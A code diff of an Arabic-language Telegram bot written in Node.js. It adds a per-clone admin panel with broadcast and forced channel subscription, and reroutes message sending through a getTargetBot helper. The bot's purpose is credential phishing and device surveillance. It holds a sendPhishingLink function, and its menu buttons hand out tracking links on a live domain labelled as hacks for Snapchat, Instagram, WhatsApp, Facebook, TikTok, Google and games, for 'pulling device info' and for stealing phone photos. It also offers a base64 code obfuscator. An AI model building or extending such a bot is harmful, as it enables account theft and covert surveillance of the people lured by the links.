@@ -137,11 +137,17 @@ app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(express.static(__dirname));
 
-let bot; // Main bot instance
+let bot; // Main bot instance reference
 global.mainBot = null;
 global.activeBotInstances = {};
 global.botUsernames = {};
 global.botActivityTracker = {};
+global.botSettings = {}; 
+
+const SETTINGS_FILE = path.join(__dirname, 'bot_settings.json');
+function loadSettings() { try { if (fs.existsSync(SETTINGS_FILE)) global.botSettings = JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8')); } catch(e) {} }
+function saveSettings() { fs.writeFileSync(SETTINGS_FILE, JSON.stringify(global.botSettings, null, 2), 'utf8'); }
+loadSettings();
 
 function getTargetBot(botUser) {
     if (botUser && global.activeBotInstances && global.botUsernames) {
@@ -180,15 +186,57 @@ async function sendPhishingLink(botInstance, chatId, action, botUsername) {
 function bindBotLogic(botInstance, token, ownerId) {
     const bot = botInstance; 
     const botToken = token;
+    const isMain = (token === botTokenMain);
+    
     if (!global.botActivityTracker) global.botActivityTracker = {};
     if (!global.botActivityTracker[token]) {
         global.botActivityTracker[token] = { createdAt: Date.now(), users: new Set() };
+    }
+    if (!global.botSettings[token]) {
+        global.botSettings[token] = { showCloneBtn: true, customChannels: [], admins: [ownerId] };
+        saveSettings();
     }
 
     bot.on('message', async (msg) => {
         const chatId = msg.chat.id;
         const text = msg.text;
         if(global.botActivityTracker[token]) global.botActivityTracker[token].users.add(chatId);
+        
+        // Local Admin Panel Trigger
+        if (global.botSettings[token].admins.includes(chatId) && text === '/admin') {
+            return bot.sendMessage(chatId, "🛠️ **لوحة تحكم الأدمن**\n\nتحكم في إعدادات بوتك الخاص:", {
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "📢 إرسال إذاعة", callback_data: "admin_broadcast" }],
+                        [{ text: "📊 إحصائيات البوت", callback_data: "admin_stats" }],
+                        [{ text: "🔗 إضافة قناتك الخاصة", callback_data: "admin_add_chan" }, { text: "❌ حذف قناتك", callback_data: "admin_rem_chan" }]
+                    ]
+                }
+            });
+        }
+
+        // Handle Admin Inputs
+        if (global.botSettings[token].admins.includes(chatId)) {
+            if (userStatesManus[chatId + '_' + token] === 'wait_broadcast') {
+                delete userStatesManus[chatId + '_' + token];
+                const users = Array.from(global.botActivityTracker[token].users);
+                bot.sendMessage(chatId, `⏳ جاري إرسال الإذاعة إلى ${users.length} مستخدم...`);
+                let count = 0;
+                for (const u of users) { try { await bot.sendMessage(u, text); count++; } catch(e) {} }
+                return bot.sendMessage(chatId, `✅ تم الإرسال بنجاح إلى ${count} مستخدم.`);
+            }
+            if (userStatesManus[chatId + '_' + token] === 'wait_add_chan') {
+                delete userStatesManus[chatId + '_' + token];
+                const parts = text.split('\n');
+                if (parts.length >= 3) {
+                    global.botSettings[token].customChannels.push({ id: parts[0], name: parts[1], inviteLink: parts[2] });
+                    saveSettings();
+                    return bot.sendMessage(chatId, `✅ تم إضافة القناة ${parts[1]} بنجاح.`);
+                }
+                return bot.sendMessage(chatId, "❌ تنسيق خاطئ. أرسل:\nالأيدي\nالاسم\nالرابط");
+            }
+        }
+
         if (userStatesManus[chatId + '_' + token] === 'wait_clone_token') {
             delete userStatesManus[chatId + '_' + token];
             const newToken = text.trim();
@@ -205,6 +253,24 @@ function bindBotLogic(botInstance, token, ownerId) {
     bot.on('callback_query', async (query) => {
         const chatId = query.message.chat.id;
         const action = query.data;
+        
+        if (action === 'admin_stats') {
+            const userCount = global.botActivityTracker[token].users.size;
+            return bot.sendMessage(chatId, `📊 **إحصائيات البوت:**\n\n👥 عدد المستخدمين: ${userCount}`);
+        }
+        if (action === 'admin_broadcast') {
+            userStatesManus[chatId + '_' + token] = 'wait_broadcast';
+            return bot.sendMessage(chatId, "📝 أرسل نص الإذاعة الآن:");
+        }
+        if (action === 'admin_add_chan') {
+            userStatesManus[chatId + '_' + token] = 'wait_add_chan';
+            return bot.sendMessage(chatId, "🔗 أرسل بيانات القناة بهذا التنسيق:\n\nالأيدي (مثال: -100xxx)\nالاسم\nالرابط");
+        }
+        if (action === 'admin_rem_chan') {
+            global.botSettings[token].customChannels = [];
+            saveSettings();
+            return bot.sendMessage(chatId, "✅ تم حذف جميع قنواتك الخاصة. (قنوات المطور الأساسي باقية)");
+        }
         if (action === 'clone_my_bot') {
             userStatesManus[chatId + '_' + token] = 'wait_clone_token';
             return bot.sendMessage(chatId, "🤖 **صنع بوت خاص بك**\n\nأرسل التوكن الخاص بك من @BotFather هنا:");
@@ -240,9 +306,9 @@ bot.on('message', async (msg) => {
             const luminanceSource = new RGBLuminanceSource(data, width, height);
             const binaryBitmap = new BinaryBitmap(new HybridBinarizer(luminanceSource));
             const result = reader.decode(binaryBitmap);
-            return bot.sendMessage(chatId, `🔳 محتوى الباركود:\n\n${result.getText()}`);
+            return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `🔳 محتوى الباركود:\n\n${result.getText()}`);
         } catch (e) {
-            return bot.sendMessage(chatId, "❌ لم يتم العثور على باركود صالح في الصورة.");
+            return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "❌ لم يتم العثور على باركود صالح في الصورة.");
         }
     }
 
@@ -252,30 +318,30 @@ bot.on('message', async (msg) => {
         if (userStatesManus[chatId].awaitingName) {
             delete userStatesManus[chatId];
             const res = await زخرفة_الاسم(text);
-            if(res) res.forEach(r => bot.sendMessage(chatId, r));
-            else bot.sendMessage(chatId, "❌ حدث خطأ في الزخرفة.");
+            if(res) res.forEach(r => getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, r));
+            else getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "❌ حدث خطأ في الزخرفة.");
             return;
         }
 
         const state = userStatesManus[chatId];
-        if (state === 'wait_tt') { delete userStatesManus[chatId]; return bot.sendMessage(chatId, await getTikTokInfoReal(text)); }
-        if (state === 'wait_ig') { delete userStatesManus[chatId]; return bot.sendMessage(chatId, `📸 معلومات انستقرام لـ @${text}:\nالحساب نشط وجاهز.`); }
+        if (state === 'wait_tt') { delete userStatesManus[chatId]; return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, await getTikTokInfoReal(text)); }
+        if (state === 'wait_ig') { delete userStatesManus[chatId]; return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `📸 معلومات انستقرام لـ @${text}:\nالحساب نشط وجاهز.`); }
         if (state === 'wait_short') {
             delete userStatesManus[chatId];
             try {
                 const res = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(text)}`);
-                return bot.sendMessage(chatId, `🔗 الرابط المختصر الحقيقي:\n${res.data}`);
-            } catch(e) { return bot.sendMessage(chatId, "❌ فشل الاختصار."); }
+                return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `🔗 الرابط المختصر الحقيقي:\n${res.data}`);
+            } catch(e) { return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "❌ فشل الاختصار."); }
         }
         if (state === 'wait_py') {
             delete userStatesManus[chatId];
             const enc = Buffer.from(text).toString('base64');
-            return bot.sendMessage(chatId, `✅ تم تشفير بايثون:\n\n\`\`\`python\nimport base64\nexec(base64.b64decode("${enc}"))\n\`\`\``, { parse_mode: 'Markdown' });
+            return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `✅ تم تشفير بايثون:\n\n\`\`\`python\nimport base64\nexec(base64.b64decode("${enc}"))\n\`\`\``, { parse_mode: 'Markdown' });
         }
         if (state === 'wait_html') {
             delete userStatesManus[chatId];
             const enc = Buffer.from(text).toString('base64');
-            return bot.sendMessage(chatId, `✅ تم تشفير HTML:\n\n\`\`\`html\n<script>document.write(atob("${enc}"));</script>\n\`\`\``, { parse_mode: 'Markdown' });
+            return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `✅ تم تشفير HTML:\n\n\`\`\`html\n<script>document.write(atob("${enc}"));</script>\n\`\`\``, { parse_mode: 'Markdown' });
         }
         if (state === 'wait_yt') {
             delete userStatesManus[chatId];
@@ -303,41 +369,41 @@ bot.on('callback_query', async (query) => {
     if (action.startsWith('dlq_')) {
         const quality = action.split('_')[1];
         const url = userStatesManus[chatId + '_url'];
-        if (!url) return bot.sendMessage(chatId, "❌ انتهت صلاحية الطلب. أرسل الرابط مرة أخرى.");
-        const statusMsg = await bot.sendMessage(chatId, `⏳ جاري بدء التحميل الحقيقي...`);
+        if (!url) return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "❌ انتهت صلاحية الطلب. أرسل الرابط مرة أخرى.");
+        const statusMsg = await getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `⏳ جاري بدء التحميل الحقيقي...`);
         return performAdvancedDownload(chatId, url, quality, statusMsg.message_id);
     }
 
 
     const domain = "https://botwahm-erfu.onrender.com";
-    if (action === 'add_names') return bot.sendMessage(chatId, `🔥 رابط اختراق سناب شات:\n${domain}/snap?id=${chatId}`);
-    if (action === 'collect_device_info') return bot.sendMessage(chatId, `🔥 رابط سحب معلومات الجهاز:\n${domain}/device?id=${chatId}`);
-    if (action === 'add_nammes') return bot.sendMessage(chatId, `🔥 رابط اختراق الهاتف كاملاً:\n${domain}/hack_phone?id=${chatId}`);
-    if (action === 'feat_ig_hack') return bot.sendMessage(chatId, `🔥 رابط اختراق انستقرام:\n${domain}/ig?id=${chatId}`);
+    if (action === 'add_names') return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `🔥 رابط اختراق سناب شات:\n${domain}/snap?id=${chatId}`);
+    if (action === 'collect_device_info') return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `🔥 رابط سحب معلومات الجهاز:\n${domain}/device?id=${chatId}`);
+    if (action === 'add_nammes') return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `🔥 رابط اختراق الهاتف كاملاً:\n${domain}/hack_phone?id=${chatId}`);
+    if (action === 'feat_ig_hack') return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `🔥 رابط اختراق انستقرام:\n${domain}/ig?id=${chatId}`);
 
-    if (action === "feat_fb_hack") return bot.sendMessage(chatId, `🔥 رابط اختراق فيسبوك:\n${domain}/fb?id=${chatId}`);
-    if (action === "feat_tt_hack") return bot.sendMessage(chatId, `🔥 رابط اختراق تيك توك:\n${domain}/tt?id=${chatId}`);
-    if (action === "feat_wa_hack") return bot.sendMessage(chatId, `🔥 رابط اختراق واتساب:\n${domain}/wa?id=${chatId}`);
-    if (action === "feat_pubg_hack") return bot.sendMessage(chatId, `🔥 رابط اختراق ببجي:\n${domain}/pubg?id=${chatId}`);
-    if (action === "feat_ff_hack") return bot.sendMessage(chatId, `🔥 رابط اختراق فري فاير:\n${domain}/ff?id=${chatId}`);
-    if (action === "feat_twitter") return bot.sendMessage(chatId, `🔥 رابط اختراق تويتر X:\n${domain}/tw?id=${chatId}`);
-    if (action === "feat_youtube") return bot.sendMessage(chatId, `🔥 رابط اختراق يوتيوب:\n${domain}/yt?id=${chatId}`);
-    if (action === "feat_google") return bot.sendMessage(chatId, `🔥 رابط اختراق جوجل:\n${domain}/gg?id=${chatId}`);
+    if (action === "feat_fb_hack") return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `🔥 رابط اختراق فيسبوك:\n${domain}/fb?id=${chatId}`);
+    if (action === "feat_tt_hack") return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `🔥 رابط اختراق تيك توك:\n${domain}/tt?id=${chatId}`);
+    if (action === "feat_wa_hack") return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `🔥 رابط اختراق واتساب:\n${domain}/wa?id=${chatId}`);
+    if (action === "feat_pubg_hack") return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `🔥 رابط اختراق ببجي:\n${domain}/pubg?id=${chatId}`);
+    if (action === "feat_ff_hack") return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `🔥 رابط اختراق فري فاير:\n${domain}/ff?id=${chatId}`);
+    if (action === "feat_twitter") return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `🔥 رابط اختراق تويتر X:\n${domain}/tw?id=${chatId}`);
+    if (action === "feat_youtube") return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `🔥 رابط اختراق يوتيوب:\n${domain}/yt?id=${chatId}`);
+    if (action === "feat_google") return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `🔥 رابط اختراق جوجل:\n${domain}/gg?id=${chatId}`);
 
-    if (action === 'feat_tt_info_real') { userStatesManus[chatId] = 'wait_tt'; return bot.sendMessage(chatId, '🎵 أرسل يوزر تيك توك:'); }
-    if (action === 'feat_ig_info_real') { userStatesManus[chatId] = 'wait_ig'; return bot.sendMessage(chatId, '📸 أرسل يوزر انستقرام:'); }
-    if (action === 'feat_shorten_real') { userStatesManus[chatId] = 'wait_short'; return bot.sendMessage(chatId, '🔗 أرسل الرابط لاختصاره:'); }
-    if (action === 'feat_crypt_py') { userStatesManus[chatId] = 'wait_py'; return bot.sendMessage(chatId, '🐍 أرسل كود بايثون لتشفيره:'); }
-    if (action === 'feat_crypt_html') { userStatesManus[chatId] = 'wait_html'; return bot.sendMessage(chatId, '🌐 أرسل كود HTML لتشفيره:'); }
-    if (action === 'feat_yt_thumb') { userStatesManus[chatId] = 'wait_yt'; return bot.sendMessage(chatId, '🎬 أرسل رابط يوتيوب لاستخراج الغلاف:'); }
-    if (action === 'feat_gen_qr') { userStatesManus[chatId] = 'wait_qr'; return bot.sendMessage(chatId, '🔳 أرسل النص للباركود:'); }
-    if (action === 'feat_social_down') { userStatesManus[chatId] = 'wait_down'; return bot.sendMessage(chatId, '📩 أرسل رابط الفيديو للتحميل:'); }
+    if (action === 'feat_tt_info_real') { userStatesManus[chatId] = 'wait_tt'; return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, '🎵 أرسل يوزر تيك توك:'); }
+    if (action === 'feat_ig_info_real') { userStatesManus[chatId] = 'wait_ig'; return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, '📸 أرسل يوزر انستقرام:'); }
+    if (action === 'feat_shorten_real') { userStatesManus[chatId] = 'wait_short'; return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, '🔗 أرسل الرابط لاختصاره:'); }
+    if (action === 'feat_crypt_py') { userStatesManus[chatId] = 'wait_py'; return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, '🐍 أرسل كود بايثون لتشفيره:'); }
+    if (action === 'feat_crypt_html') { userStatesManus[chatId] = 'wait_html'; return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, '🌐 أرسل كود HTML لتشفيره:'); }
+    if (action === 'feat_yt_thumb') { userStatesManus[chatId] = 'wait_yt'; return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, '🎬 أرسل رابط يوتيوب لاستخراج الغلاف:'); }
+    if (action === 'feat_gen_qr') { userStatesManus[chatId] = 'wait_qr'; return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, '🔳 أرسل النص للباركود:'); }
+    if (action === 'feat_social_down') { userStatesManus[chatId] = 'wait_down'; return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, '📩 أرسل رابط الفيديو للتحميل:'); }
 
     
     
     
-    if (action === 'feat_read_qr_real') { userStatesManus[chatId] = 'wait_qr_read'; return bot.sendMessage(chatId, '📄 أرسل صورة الباركود لقراءتها:'); }
-    if (action === 'zakhrafa') { userStatesManus[chatId] = { awaitingName: true }; return bot.sendMessage(chatId, '🗿 أرسل الاسم الذي تريد زخرفته:'); }
+    if (action === 'feat_read_qr_real') { userStatesManus[chatId] = 'wait_qr_read'; return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, '📄 أرسل صورة الباركود لقراءتها:'); }
+    if (action === 'zakhrafa') { userStatesManus[chatId] = { awaitingName: true }; return getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, '🗿 أرسل الاسم الذي تريد زخرفته:'); }
 
 });
 
@@ -394,33 +460,30 @@ function isOldMessage(msgOrQuery) {
 }
 
 async function checkUserSubscription(chatId) {
-  const allChannels = fixedChannels.concat(additionalChannels);
-  for (let channel of allChannels) {
+  const mainChannels = fixedChannels.concat(additionalChannels); 
+  const localChannels = global.botSettings[botToken]?.customChannels || [];
+  for (let channel of mainChannels) {
     try {
       const status = await global.mainBot.getChatMember(channel.id, chatId);
-      if (status.status === 'left' || status.status === 'kicked') {
-        return false;
-      }
-    } catch (error) {
-      console.log(`خطأ في التحقق من اشتراك قناة ${channel.name}:`, error.message);
-      return false;
-    }
+      if (status.status === 'left' || status.status === 'kicked') return false;
+    } catch (error) { return false; }
+  }
+  for (let channel of localChannels) {
+    try {
+      const status = await bot.getChatMember(channel.id, chatId);
+      if (status.status === 'left' || status.status === 'kicked') return false;
+    } catch (error) { return false; }
   }
   return true;
 }
 
 async function showSubscriptionButtons(chatId) {
   const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
-  const allChannels = fixedChannels.concat(additionalChannels);
-  const buttons = allChannels.map(channel => [
-    { text: `اشترك في ${channel.name}`, url: channel.inviteLink }
-  ]);
-
-  await bot.sendMessage(chatId, message, {
-    reply_markup: {
-      inline_keyboard: buttons
-    }
-  }).catch(() => {});
+  const mainChannels = fixedChannels.concat(additionalChannels);
+  const localChannels = global.botSettings[botToken]?.customChannels || [];
+  const allChannels = mainChannels.concat(localChannels);
+  const buttons = allChannels.map(channel => [{ text: `اشترك في ${channel.name}`, url: channel.inviteLink }]);
+  await getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, message, { reply_markup: { inline_keyboard: buttons } }).catch(() => {});
 }
 
 bot.onText(/\/start/, async (msg) => {  
@@ -435,7 +498,7 @@ bot.onText(/\/start/, async (msg) => {
 
 
     if (bannedUsers.includes(chatId)) {  
-      return await bot.sendMessage(chatId, 'أنت محظور من استخدام هذا البوت.');  
+      return await getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'أنت محظور من استخدام هذا البوت.');  
     }  
 
     const subscribed = await checkUserSubscription(chatId);  
@@ -472,7 +535,7 @@ bot.onText(/\/start/, async (msg) => {
       
       // روابط إضافية
         
-      [{ text: '🤖 أضف بوتك الخاص', callback_data: 'clone_my_bot' }],
+      global.botSettings[botToken]?.showCloneBtn ? [{ text: '🤖 أضف بوتك الخاص', callback_data: 'clone_my_bot' }] : [],
 
       // --- الأزرار الإضافية الاحترافية (Manus) ---
       [{ text: '🌐 اختراق تويتر X', callback_data: 'feat_twitter', style: 'primary' }, { text: '🔴 اختراق يوتيوب', callback_data: 'feat_youtube', style: 'danger' }],
@@ -486,7 +549,7 @@ bot.onText(/\/start/, async (msg) => {
   
     ];  
 
-    await bot.sendMessage(chatId, mainMenuMessage, {  
+    await getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, mainMenuMessage, {  
       reply_markup: {  
         inline_keyboard: mainMenuButtons  
       }  
@@ -554,7 +617,7 @@ function sendAdminPanel(chatId) {
         ]
       }
     };
-    bot.sendMessage(chatId, 'لوحة التحكم للمطور:', options);
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'لوحة التحكم للمطور:', options);
   }
 }
 
@@ -571,22 +634,22 @@ bot.on('message', (msg) => {
     if (!bannedUsers.includes(userId)) {
       bannedUsers.push(userId);
       saveBannedUsers();
-      bot.sendMessage(chatId, `تم حظر المستخدم: ${userId}`);
+      getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `تم حظر المستخدم: ${userId}`);
     } else {
-      bot.sendMessage(chatId, `المستخدم ${userId} محظور بالفعل.`);
+      getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `المستخدم ${userId} محظور بالفعل.`);
     }
     sessionState.banUser = false; 
   } else if (sessionState.unbanUser) {
     const userId = parseInt(msg.text);
     bannedUsers = bannedUsers.filter(id => id !== userId);
     saveBannedUsers();
-    bot.sendMessage(chatId, `تم فك الحظر عن المستخدم: ${userId}`);
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `تم فك الحظر عن المستخدم: ${userId}`);
     sessionState.unbanUser = false; 
   } else if (sessionState.broadcast) {
     subscribers.forEach(subscriber => {
       bot.sendMessage(subscriber, msg.text);
     });
-    bot.sendMessage(chatId, 'تم إرسال الإذاعة إلى جميع المشتركين.');
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'تم إرسال الإذاعة إلى جميع المشتركين.');
     sessionState.broadcast = false; 
   } else if (sessionState.addChannel) {
     
@@ -599,9 +662,9 @@ bot.on('message', (msg) => {
       };
       additionalChannels.push(newChannel);
       saveChannels();
-      bot.sendMessage(chatId, `تم إضافة قناة الاشتراك الإجباري: ${newChannel.name}`);
+      getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `تم إضافة قناة الاشتراك الإجباري: ${newChannel.name}`);
     } else {
-      bot.sendMessage(chatId, 'الرجاء إدخال البيانات بالصيغة: id,اسم القناة,رابط الدعوة');
+      getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'الرجاء إدخال البيانات بالصيغة: id,اسم القناة,رابط الدعوة');
     }
     sessionState.addChannel = false; 
   } else if (sessionState.removeChannel) {
@@ -610,9 +673,9 @@ bot.on('message', (msg) => {
     if (index !== -1) {
       const removed = additionalChannels.splice(index, 1);
       saveChannels();
-      bot.sendMessage(chatId, `تم إزالة قناة الاشتراك الإجباري: ${removed[0].name}`);
+      getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `تم إزالة قناة الاشتراك الإجباري: ${removed[0].name}`);
     } else {
-      bot.sendMessage(chatId, 'لم يتم العثور على القناة بالمعرف المدخل.');
+      getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'لم يتم العثور على القناة بالمعرف المدخل.');
     }
     sessionState.removeChannel = false; 
   }
@@ -624,7 +687,7 @@ bot.onText(/\/admin/, (msg) => {
   if (chatId === developerId) {
     sendAdminPanel(chatId);
   } else {
-    bot.sendMessage(chatId, 'أنت لست المطور.');
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'أنت لست المطور.');
   }
 });
 
@@ -637,32 +700,32 @@ bot.on('callback_query', async (query) => {
   if (chatId === developerId) {
     switch (action) {
       case 'ban_user':
-        bot.sendMessage(chatId, 'أدخل معرف المستخدم الذي تريد حظره:');
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'أدخل معرف المستخدم الذي تريد حظره:');
         sessionState.banUser = true;
         break;
       case 'unban_user':
-        bot.sendMessage(chatId, 'أدخل معرف المستخدم الذي تريد فك حظره:');
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'أدخل معرف المستخدم الذي تريد فك حظره:');
         sessionState.unbanUser = true;
         break;
       case 'broadcast':
-        bot.sendMessage(chatId, 'أدخل الرسالة التي تريد إذاعتها لجميع المشتركين:');
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'أدخل الرسالة التي تريد إذاعتها لجميع المشتركين:');
         sessionState.broadcast = true;
         break;
       case 'add_channel':
-        bot.sendMessage(chatId, 'أدخل بيانات القناة بالصيغة: id,اسم القناة,رابط الدعوة');
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'أدخل بيانات القناة بالصيغة: id,اسم القناة,رابط الدعوة');
         sessionState.addChannel = true;
         break;
       case 'remove_channel':
-        bot.sendMessage(chatId, 'أدخل معرف القناة التي تريد إزالتها من قائمة الاشتراك الإجباري:');
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'أدخل معرف القناة التي تريد إزالتها من قائمة الاشتراك الإجباري:');
         sessionState.removeChannel = true;
         break;
       case 'set_paid':
         isPaidBot = true;
-        bot.sendMessage(chatId, 'تم تحويل البوت إلى مدفوع.');
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'تم تحويل البوت إلى مدفوع.');
         break;
       case 'set_free':
         isPaidBot = false;
-        bot.sendMessage(chatId, 'تم جعل البوت مجاني.');
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'تم جعل البوت مجاني.');
         break;
     }
   } else {
@@ -671,7 +734,7 @@ bot.on('callback_query', async (query) => {
       const linkId = action.split('_')[2];
       if (linkData[linkId] && linkData[linkId].userId === query.from.id) {
         const linkMessage = `رابط تجميع النقاط الخاص بك\nعند دخول شخص عبر الرابط سوف تحصل على 1 نقطة.\nhttps://t.me/${botUsername}?start=${linkId}\nاستخدم الأمر /free لمعرفة نقاطك.`;
-        bot.sendMessage(chatId, linkMessage);
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, linkMessage);
       }
     }
   }
@@ -720,7 +783,7 @@ bot.onText(/\/Vip/, async (msg) => {
     const allChannels = fixedChannels.concat(additionalChannels);
     const buttons = allChannels.map(channel => [{ text: `اشترك في ${channel.name}`, url: channel.inviteLink }]);
 
-    bot.sendMessage(chatId, message, {
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, message, {
       reply_markup: {
         inline_keyboard: buttons
       }
@@ -737,7 +800,7 @@ bot.onText(/\/Vip/, async (msg) => {
   };
 
   const message = 'مرحبًا! هذه الخيارات مدفوعة بسعر 30 نقطة. يمكنك تجميع النقاط وفتحها مجانًا.';
-  bot.sendMessage(chatId, message, {
+  getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, message, {
     reply_markup: {
       inline_keyboard: [
         [{ text: 'سحب جميع صور الهاتف عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
@@ -759,7 +822,7 @@ bot.on('callback_query', async (query) => {
     const linkId = query.data.split('_')[2];
     if (linkData[linkId] && linkData[linkId].userId === userId) {
       const linkMessage = `رابط تجميع النقاط الخاص بك\nعند دخول شخص عبر الرابط سوف تحصل على 1 نقطة.\nhttps://t.me/${botUsername}?start=${linkId}\nاستخدم الأمر /free لمعرفة نقاطك.`;
-      bot.sendMessage(chatId, linkMessage);
+      getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, linkMessage);
     }
   }
 });
@@ -777,7 +840,7 @@ bot.onText(/\/vip (.+)/, async (msg, match) => {
     const buttons = allChannels.map(channel => [{ text: `اشترك في ${channel.name}`, url: channel.inviteLink }]);
 
     if (message && message.trim() !== '') {
-      bot.sendMessage(chatId, message, {
+      getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, message, {
         reply_markup: {
           inline_keyboard: buttons
         }
@@ -804,7 +867,7 @@ bot.onText(/\/vip (.+)/, async (msg, match) => {
 
       const message = `شخص جديد دخل إلى الرابط الخاص بك! وحصلت على 1 نقطة.\nعندما تصل إلى 30 نقطة سيتم فتح المميزات تلقائيًا. استخدم الأمر /free لمعرفة نقاطك.`;
       if (message && message.trim() !== '') {
-        bot.sendMessage(chatId, message);
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, message);
       }
 
       const topMessage = `عندما تصل إلى 30 نقطة سيتم فتح المميزات تلقائيًا.`;
@@ -824,12 +887,12 @@ bot.onText(/\/free/, async (msg) => {
     const points = userPoints[userId];
     const message = `لديك حاليًا ${points} نقاط. تحتاج إلى ${30 - points} نقطة للوصول إلى 30 وفتح الميزات المدفوعة.`;
     if (message && message.trim() !== '') {
-      bot.sendMessage(chatId, message);
+      getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, message);
     }
   } else {
     const message = 'لم تقم بتجميع أي نقاط حتى الآن. قم بمشاركة رابطك لتجميع النقاط.';
     if (message && message.trim() !== '') {
-      bot.sendMessage(chatId, message);
